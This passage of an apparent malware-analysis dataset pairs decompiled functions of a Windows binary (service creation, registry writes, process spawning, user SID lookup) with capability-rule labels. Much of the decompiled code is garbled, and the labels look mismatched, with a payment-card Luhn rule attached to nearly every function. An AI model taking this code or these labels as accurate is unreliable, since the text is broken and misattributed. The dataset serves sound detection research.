  uStack305 = 0;\n    uVar11 = (*_sym.imp.MSVCRT.dll__stricmp)();\n    puVar5 = uVar11 >> 0x20;\n    bVar9 = uVar11 != 0;\n    if (bVar9) {\n        return 1;\n    }\n    if (bVar9) {\n        uStack300 = SUB41(puVar7, 0);\n        uStack299 = puVar7 >> 8;\n        uStack298 = puVar7 >> 0x10;\n        uStack297 = puVar7 >> 0x18;\n        if (!bVar9) {\n            uVar4 = in(uVar11 >> 0x20);\n            *puVar7 = uVar4;\n            if (&stack0xfffffed8 < 1) {\n                uStack301 = 0xbf;\n                uStack300 = 0x26;\n                uStack299 = 0x40;\n                uStack298 = 0;\n                iStack24 = fcn.00401e60();\n    // WARNING: Bad instruction - Truncating control flow here\n                if (iStack24 != 0) {\n                    uStack612 = 0;\n                    puVar6 = &stack0xfffffd9d;\n                    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar6 = 0;\n                        puVar6 = puVar6 + 1;\n                    }\n                    *puVar6 = 0;\n                    *(puVar6 + 2) = 0;\n                    uStack301 = 0;\n                    uStack300 = 0;\n                    uStack299 = 0;\n                    uStack298 = 0;\n                    uStack305 = 0x26;\n                    uStack304 = 0;\n                    uStack303 = 0;\n                    uStack309 = SUB41(&stack0xfffffd9c, 0);\n                    uStack308 = &stack0xfffffd9c >> 8;\n                    uStack307 = &stack0xfffffd9c >> 0x10;\n                    uStack313 = 0;\n                    uStack312 = 0;\n                    uStack311 = 0;\n                    uStack317 = 8;\n                    uStack316 = 0x27;\n                    uStack315 = 0x40;\n                    iStack24 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n                    if (iStack24 != 0) {\n                        if ((iStack24 < 0) || (iStack24 >= 0)) {\n                            uStack317 = 0x2a;\n                            uStack316 = 0x27;\n                            uStack315 = 0x40;\n                            fcn.00404060();\n                        }\n                        else {\n                            pcVar1 = iStack24 + 0x1936e82f;\n                            *pcVar1 = *pcVar1 + pcVar1;\n                        }\n                        _auStack353 = _auStack353 & 0xffff00ff;\n                        puVar6 = &stack0xfffffea1;\n                        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *puVar6 = 0;\n                            puVar6 = puVar6 + 1;\n                        }\n                        *puVar6 = 0;\n                        *(puVar6 + 2) = 0;\n                        uStack317 = 3;\n                        uStack316 = 0;\n                        uStack315 = 0;\n                        puStack325 = &stack0xfffffd9c;\n    // WARNING: Could not recover jumptable at 0x0040276b. Too many branches\n    // WARNING: Treating indirect jump as call\n                        puStack321 = 0x41136c;\n                        iStack329 = 0x41138c;\n                        uStack333 = SUB41(&stack0xfffffea0, 0);\n                        uStack332 = &stack0xfffffea0 >> 8;\n                        uStack331 = &stack0xfffffea0 >> 0x10;\n                        uStack337 = 0x402784;\n                        (*_sym.imp.MSVCRT.dll_sprintf)();\n                        pcVar2 = _sym.imp.USER32.dll_EnumWindows;\n                        iStack24 = 0;\n                        puVar6 = _sym.imp.KERNEL32.dll_Sleep;\n                        do {\n                            puVar7 = &stack0xffffffa4;\n                            for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar7 = 0;\n                                puVar7 = puVar7 + 1;\n                            }\n                            uStack44 = 0;\n                            uStack20 = 0;\n                            uStack16 = 0;\n                            auStack92[0] = 0x44;\n                            uStack12 = 0;\n                            uStack48 = 1;\n                            var_4h = 0;\n                            puStack321 = &stack0xffffffa4;\n                            uStack317 = SUB41(&stack0xffffffec, 0);\n                            uStack316 = &stack0xffffffec >> 8;\n                            uStack315 = &stack0xffffffec >> 0x10;\n                            puStack325 = NULL;\n                            iStack329 = 0;\n                            uStack333 = 0;\n                            uStack332 = 0;\n                            uStack331 = 0;\n                            uStack337 = 0;\n                            uStack341 = 0;\n                            auStack351._2_4_ = &stack0xfffffea0;\n                            uStack345 = 0;\n                            _auStack353 = 0;\n                            uStack357 = 0x40280c;\n                            iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                            if (iVar3 == 0) {\n                                return 0;\n                            }\n                            uStack357 = 3000;\n                            uStack361 = 0x402838;\n                            (*puVar6)();\n                            uStack361 = uStack12;\n                            pcStack365 = fcn.00402570;\n                            uStack369 = 0x402843;\n                            (*pcVar2)();\n                            uStack369 = 1000;\n                            uStack373 = uStack20;\n                            uStack377 = 0x402878;\n                            iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                            uVar10 = SBORROW4(iVar3, 0x102);\n                            uVar4 = extraout_ECX;\n                            if (iVar3 == 0x102) {\n                                uStack377 = 1;\n                                uStack381 = uStack20;\n                                uStack385 = 0x40288b;\n                                (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n                                uVar4 = extraout_ECX_00;\n                            }\n                            uStack377 = uStack16;\n                            puVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                            if ((!uVar10) && (uVar10)) {\n                                *puVar7 = *puVar6;\n                                uStack377 = uVar4;\n                                puVar6 = puVar6 + 1;\n                                puVar8 = puVar7 + 1;\n                            }\n                            uStack381 = 0x4028a5;\n                            (*puVar8)();\n                            uStack381 = uStack20;\n                            uStack385 = 0x4028ab;\n                            (*puVar8)();\n                            iStack24 = iStack24 + 1;\n                        } while (iStack24 < 1);\n                    }\n                }\n                return iStack24;\n            }\n            goto code_r0x00402634;\n        }\n    }\n    uStack300 = 0;\n    uStack299 = 0;\n    uStack298 = 0;\n    uStack297 = 0;\ncode_r0x00402634:\n    *puVar5 = *puVar5 ^ extraout_CH;\n    uStack304 = 0xf0;\n    uStack303 = 0x4024;\n    uStack301 = 0;\n    uStack308 = arg_8h;\n    uStack307 = arg_8h >> 8;\n    uStack305 = arg_8h >> 0x18;\n    uVar10 = uStack305;\n    uStack312 = 0x4a;\n    uStack311 = 0x4026;\n    uStack309 = 0;\n    (*_sym.imp.USER32.dll_EnumChildWindows)();\n    uStack312 = 0x50;\n    uStack311 = 0x4026;\n    uStack309 = 0;\n    iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n    iVar3 = (iVar3 % 10 + 4) * 1000;\n    uStack312 = iVar3;\n    uStack311 = iVar3 >> 8;\n    uStack309 = iVar3 >> 0x18;\n    uStack316 = 0x6e;\n    uStack315 = 0x4026;\n    uStack313 = 0;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    uStack316 = 0;\n    uStack315 = 0;\n    uStack313 = 0;\n    uStack317 = 0;\n    puStack321 = NULL;\n    puStack325 = CONCAT31(0x10, uVar10);\n    uStack332 = 0x7b;\n    uStack331 = 0x4026;\n    iStack329 = arg_8h << 8;\n    (*_sym.imp.USER32.dll_PostMessageA)();\n    return 0;\n}\n",
        "token_count": 3006
    },
    "004028f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004028f0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00403330(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00403330(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 162
    },
    "00403120": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403120(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, arg_8h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 261
    },
    "00403290": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403290(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)\n                      (*(uVar2 - 4), *(uVar2 + 0x10), 0, *(uVar2 + 0x14), *(uVar2 + 0x18), *(uVar2 + 0x1c));\n    if (iVar1 == 0) {\n        uVar3 = *(uVar2 - 8);\n    }\n    else {\n        uVar3 = 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(uVar2 - 4));\n    return uVar3;\n}\n",
        "token_count": 300
    },
    "004039e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403b39) overlaps instruction at (ram,0x00403b35)\n// \n// WARNING: Removing unreachable block (ram,0x00403a2a)\n// WARNING: Removing unreachable block (ram,0x00403b36)\n\nvoid __fastcall fcn.004039e0(int32_t param_1, char *param_2, char **param_3)\n\n{\n    int32_t iVar1;\n    ushort uVar2;\n    ushort uVar3;\n    uint8_t uVar4;\n    uint16_t in_AX;\n    uint16_t uVar5;\n    char cVar6;\n    char *pcVar7;\n    uint32_t unaff_EBX;\n    uint unaff_EBP;\n    ushort *puVar8;\n    char *unaff_ESI;\n    char *pcVar9;\n    char *pcVar10;\n    uint16_t in_ES;\n    uint8_t uVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    bool bVar13;\n    char *unaff_retaddr;\n    char *pcVar14;\n    char *pcVar15;\n    uint16_t uStack8;\n    ushort uStack4;\n    ushort uStack2;\n    \n    uStack4 = unaff_EBP;\n    uStack2 = unaff_EBP >> 0x10;\n    uStack8 = unaff_EBX;\n    *param_3 = 0x98;\n    *(param_3 + 1) = 0xa5;\n    *(param_3 + 2) = 0x21;\n    uVar11 = param_2 & 0xffff;\n    uVar5 = ((in_AX & 0xff | (in_AX >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n            CONCAT11((param_2 & 0xffff) >> 8 | uVar11, uVar11);\n    uVar11 = uVar5 < 0x4001;\n    bVar12 = uVar5 == 0x4001;\n    while( true ) {\n        uVar4 = in_AX;\n        *(param_3 + 3) = 0xad;\n        if ((!uVar11 && !bVar12) && (uVar11 || bVar12)) {\n            uVar4 = uVar4 & 0x58;\n        }\n        *(param_3 + 1) = 0x3c;\n        unaff_EBX = unaff_EBX & 0xffff;\n        *(param_3 + 5) = 0x6b;\n        *(param_3 + 6) = 0xf9;\n        *(param_3 + 7) = 0xeb;\n        bVar12 = uVar4 == 1;\n        *(param_3 + 2) = 0x73;\n        if ((!bVar12) && (bVar12)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(param_3 + 9) = 0x32;\n        if ((!bVar12) && (bVar12)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(param_3 + 10) = 0xa4;\n        puVar8 = &uStack4;\n        pcVar14 = unaff_ESI;\n        if ((uVar4 < '\\x02') || (puVar8 = &uStack4,  '\\x01' < uVar4)) break;\n        uVar11 = 9 < (uVar4 & 0xf) | in_AF;\n        in_AX = uVar4 + uVar11 * '\\x06' & 0xff0f;\n        in_AF = uVar11;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\ncode_r0x00403acf:\n    uVar3 = uStack2;\n    uVar2 = uStack4;\n    *(param_3 + 0xb) = 0x2f;\n    bVar12 = (POPCOUNT(unaff_EBX + 1 & 0xff) & 1U) == 0;\n    *(param_3 + 3) = 0x15;\n    if ((bVar12) || (!bVar12)) {\n        *(param_3 + 0xd) = 0x40;\n    }\n    pcVar9 = unaff_ESI + 0x47;\n    unaff_EBX = uStack8;\n    *(param_3 + 0xe) = 0xdd;\n    uStack4 = uStack2;\n    cVar6 = param_2;\n    bVar12 = (POPCOUNT(cVar6 + -0x51) & 1U) == 0;\n    pcVar10 = CONCAT22(uStack2, uVar2);\n    *(param_3 + 0xf) = 0x9c;\n    uStack2 = param_2;\n    if ('P' < cVar6) {\n        uStack4 = SUB42(param_3, 0);\n        uStack2 = param_3 >> 0x10;\n        if (cVar6 < 'Q') {\n            unaff_retaddr = unaff_retaddr & 0xffff0000 | in_ES;\n            pcVar9 = unaff_ESI + 0x46;\n            pcVar10 = param_3 | puVar8;\n            param_3 = pcVar10 + 1;\n            *pcVar10 = uVar2;\n            param_2 = param_2 & 0xffffff00;\n            uVar5 = uVar2 + (uVar2 >> 8) * 'y';\n            pcVar10 = CONCAT22(uVar3, uVar5);\n            bVar12 = (POPCOUNT(uVar5) & 1U) == 0;\n        }\n    }\n    *(param_3 + 4) = 0xca;\n    pcVar15 = pcVar14;\n    if (bVar12) goto code_r0x00403b54;\n    do {\n        if (bVar12) {\n            unaff_ESI = *param_3;\n            *param_3 = pcVar9;\n            puVar8 = puVar8 + -*(puVar8 + 0x5f9dff63);\n            if (puVar8 < 0) break;\n            bVar12 = unaff_ESI < 0;\n            bVar13 = unaff_ESI == NULL;\n            pcVar9 = pcVar10;\n            pcVar7 = param_2;\n            if (bVar12) goto code_r0x00403b54;\n        }\n        else {\ncode_r0x00403b54:\n            *(param_3 + 0x11) = 0x6c;\n            bVar12 = (POPCOUNT(param_2 >> 8 & 0x12) & 1U) == 0;\n            iVar1 = *(puVar8 + 8);\n            *(iVar1 + 0x12) = 0xaf;\n            if ((bVar12) || (!bVar12)) {\n                *(iVar1 + 0x13) = 0x5d;\n            }\n            puVar8 = *0xc617b43a;\n            unaff_ESI = 0x34a96cf5;\n            unaff_EBX = (unaff_EBX & 0xffff) + *(puVar8 + 0x50);\n            uStack4 = SUB42(pcVar14, 0);\n            uStack2 = pcVar14 >> 0x10;\n            uStack8 = pcVar10;\n            bVar12 = false;\n            bVar13 = (pcVar14 - 5U & 0x44) == 0;\n            *0x34a96d09 = 0x20;\n            pcVar9 = unaff_retaddr;\n            pcVar7 = pcVar10;\n            pcVar15 = param_2;\n        }\n        if ((bVar13 || bVar12) || (!bVar13 && !bVar12)) {\n            **(puVar8 + 0xc) = 0x15;\n            return;\n        }\n        in_AF = 9 < (pcVar9 & 0xf) | in_AF;\n        uVar11 = pcVar9 + in_AF * '\\x06';\n        pcVar10 = pcVar9 & 0xffff0000 | CONCAT11((pcVar9 >> 8) + in_AF, uVar11) & 0xff0f;\n        if (pcVar14 != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *pcVar10 = *pcVar10 + (uVar11 & 0xf);\n        bVar12 = (POPCOUNT(*pcVar10) & 1U) == 0;\n        param_2 = pcVar7;\n        pcVar9 = unaff_ESI;\n    } while( true );\n    param_3 = param_3 + 1;\n    puVar8 = puVar8 | *param_3;\n    pcVar14 = pcVar15;\n    goto code_r0x00403acf;\n}\n",
        "token_count": 2038
    },
    "null": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.004029e0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.004030c0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "004017b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.004017b0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    uint unaff_EDI;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    uint uVar5;\n    uint uVar6;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    uVar5 = unaff_EDI;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    while( true ) {\n        bVar2 = false;\n        bVar4 = false;\n        bVar3 = unaff_EDI == 0;\n        uVar6 = nitems;\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        if ((bVar2 || bVar3) || (!bVar2 && !bVar3)) break;\n        unaff_EDI = uVar5;\n        uVar5 = uVar6;\n        if (!bVar4) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 304
    },
    "00401a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a77) overlaps instruction at (ram,0x00401a75)\n// \n// WARNING: Removing unreachable block (ram,0x00401a74)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401a60(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    bool bVar2;\n    \n    if (arg_ch == 1) {\n        fcn.00404400();\n        fcn.00402e40();\n        bVar2 = false;\n        uVar1 = fcn.00402690();\n        if ((!bVar2) && (bVar2)) {\n            out(0xbd, uVar1);\n            return;\n        }\n        if (*0x4224a4 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00403cc0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 261
    },
    "00401cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401cf0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 128
    },
    "00401e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401e30(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00401e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401f28) overlaps instruction at (ram,0x00401f1f)\n// \n// WARNING: Removing unreachable block (ram,0x00401f19)\n\nbool fcn.00401e60(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x411440, 0x411468, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(0xf0, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(0xf0);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 388
    },
    "00402690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004026ba) overlaps instruction at (ram,0x004026b7)\n// \n// WARNING: Removing unreachable block (ram,0x00402757)\n// WARNING: Removing unreachable block (ram,0x00402761)\n// WARNING: Removing unreachable block (ram,0x00402765)\n\nvoid __fastcall fcn.00402690(uint param_1, uint param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    uchar uVar10;\n    uchar uStack612;\n    uint uStack611;\n    uchar uStack352;\n    uint uStack351;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    bVar9 = CARRY1(param_2, param_2 >> 8);\n    fcn.00404d60();\n    if ((!bVar9) && (bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar3 = fcn.00401e60();\n    if (iVar3 != 0) {\n        uStack612 = 0;\n        puVar6 = &uStack611;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, *0x10 + -0x264, 0x26, 0);\n        if (iVar3 != 0) {\n            if ((iVar3 < 0) || (iVar3 >= 0)) {\n                fcn.00404060();\n            }\n            else {\n                pcVar1 = iVar3 + 0x1936e82f;\n                *pcVar1 = *pcVar1 + pcVar1;\n            }\n            uStack352 = 0;\n            puVar6 = &uStack351;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n    // WARNING: Could not recover jumptable at 0x0040276b. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.MSVCRT.dll_sprintf)(&uStack352, 0x41138c, &uStack612, 0x41136c, 3);\n            pcVar2 = _sym.imp.USER32.dll_EnumWindows;\n            iStack24 = 0;\n            puVar6 = _sym.imp.KERNEL32.dll_Sleep;\n            do {\n                puVar7 = auStack92;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                uStack44 = 0;\n                uStack20 = 0;\n                uStack16 = 0;\n                auStack92[0] = 0x44;\n                uStack12 = 0;\n                uStack48 = 1;\n                uStack8 = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &uStack352, 0, 0, 0, 0, 0, 0, auStack92, &uStack20);\n                if (iVar3 == 0) {\n                    return;\n                }\n                (*puVar6)(3000);\n                (*pcVar2)(fcn.00402570, uStack12);\n                iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack20, 1000);\n                uVar10 = SBORROW4(iVar3, 0x102);\n                uVar4 = extraout_ECX;\n                if (iVar3 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack20, 1);\n                    uVar4 = extraout_ECX_00;\n                }\n                uVar5 = uStack16;\n                puVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((!uVar10) && (uVar10)) {\n                    *puVar7 = *puVar6;\n                    uVar5 = uVar4;\n                    puVar6 = puVar6 + 1;\n                    puVar8 = puVar7 + 1;\n                }\n                (*puVar8)(uVar5);\n                (*puVar8)(uStack20);\n                iStack24 = iStack24 + 1;\n            } while (iStack24 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1203
    },
    "00402a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402a40(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 108
    },
    "00402ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402ac0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00403120(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4111b8, 0x4111f8, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 249
    },
    "00403040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403086) overlaps instruction at (ram,0x00403085)\n// \n// WARNING: Removing unreachable block (ram,0x00403086)\n\nchar * __cdecl fcn.00403040(char *arg_8h, int32_t arg_ch, char *arg_10h, char **arg_14h)\n\n{\n    uint8_t in_CL;\n    char **ppcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != NULL) {\n        ppcVar1 = arg_14h;\n        if ((-1 < arg_14h) && (-1 >= arg_14h)) {\n            out(0xc4, arg_8h);\n            pcVar2 = pcVar2 & 0xffffff00 | pcVar2 ^ in_CL;\n            ppcVar1 = arg_14h + 1;\n            *arg_14h = arg_8h;\n        }\n        if (arg_8h <= pcVar2) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    pcVar3 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar3 = pcVar3 + 1;\n                        ppcVar1 = ppcVar1 + -1;\n                        if (ppcVar1 == NULL) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                    } while (bVar5);\n                    ppcVar1 = arg_14h;\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar2);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 459
    },
    "00403600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403600(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00403bd0": {
        "rules": [
